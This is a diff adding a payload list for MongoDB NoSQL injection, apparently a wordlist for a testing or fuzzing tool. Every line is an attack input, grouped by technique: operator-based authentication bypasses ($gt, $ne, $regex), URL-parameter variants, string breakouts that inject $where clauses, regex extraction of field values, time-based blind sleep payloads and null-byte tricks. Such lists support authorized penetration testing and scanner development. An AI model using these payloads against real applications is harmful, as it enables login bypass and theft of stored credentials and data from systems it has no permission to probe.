@@ -1,0 +1,57 @@
+# MongoDB NoSQL Injection Payloads
+
+# JSON injection - Authentication bypass
+{"$gt": ""}
+{"$ne": ""}
+{"$ne": null}
+{"$regex": ".*"}
+{"$where": "1==1"}
+{"$exists": true}
+{"$nin": []}
+
+# URL parameter injection
+[$gt]=
+[$ne]=
+[$regex]=.*
+[$exists]=true
+
+# String-based injection
+' || '1'=='1
+'; return '' == '
+1'; return true; var foo='
+true, $where: '1 == 1'
+, $where: '1 == 1'
+$where: '1 == 1'
+
+# Regex-based extraction
+{"$regex": "^a"}
+{"$regex": "^b"}
+{"$regex": "^c"}
+{"$regex": ".*", "$options": "i"}
+
+# JavaScript injection
+{"$where": "this.password.length > 0"}
+{"$where": "function() { return true; }"}
+{"$where": "this.username == 'admin'"}
+
+# Array injection
+{"$in": ["admin", "root", "administrator"]}
+{"$all": ["admin"]}
+
+# Operator injection
+{"password": {"$gt": ""}}
+{"password": {"$ne": ""}}
+{"username": {"$regex": "admin"}, "password": {"$ne": ""}}
+
+# Blind NoSQL injection
+{"$where": "sleep(5000)"}
+{"$where": "this.a > 1 || sleep(5000)"}
+
+# Null byte injection
+{"username": "admin\u0000"}
+
+# Authentication bypass combinations
+{"username": {"$gt": ""}, "password": {"$gt": ""}}
+{"username": {"$ne": ""}, "password": {"$ne": ""}}
+{"username": "admin", "password": {"$gt": ""}}
+{"username": {"$in": ["admin", "root"]}, "password": {"$gt": ""}}
